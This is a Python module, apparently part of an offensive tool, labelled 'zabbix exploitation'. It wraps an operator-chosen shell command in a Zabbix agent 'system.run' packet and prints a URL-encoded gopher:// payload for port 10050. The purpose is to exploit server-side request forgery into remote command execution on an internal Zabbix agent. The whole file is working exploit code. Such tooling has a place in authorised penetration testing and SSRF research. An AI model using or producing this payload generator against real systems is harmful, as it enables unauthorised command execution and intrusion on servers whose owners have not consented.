import struct
from urllib.parse import quote_from_bytes

class Zabbix:
    def __init__(self, subparsers):
        parser = subparsers.add_parser("zabbix", help="zabbix exploitation")
        parser.add_argument("-t", "--target", help="Target", default="127.0.0.1:10050")
        parser.add_argument("-c", "--command", required=True, help="Command")
        parser.add_argument("--double-encode", action='store_true', help="Double URL encode",)
        parser.set_defaults(run=self.run)

    def make_package(self, command: str) -> bytes:
        protocol_header = "ZBXD" # zabbix protocol header
        protocol_flags = "\x01" # Flag 0x01: Zabbix communications protocol
        data = f"system.run[{command}]"

        package = b""
        package += protocol_header.encode()
        package += protocol_flags.encode()
        package += struct.pack("<II", len(data) + 2, 0) # data length + 2 bytes to include CRLF
        package += data.encode()

        return package

    def encode(self, payload: bytes) -> str: 
        return quote_from_bytes(payload)

    def run(self, args) -> str:
        zabbix_package = self.make_package(args.command)
        payload = self.encode(zabbix_package)

        if args.double_encode:
            payload = self.encode(payload.encode())

        print(f"gopher://{args.target}/_{payload}")
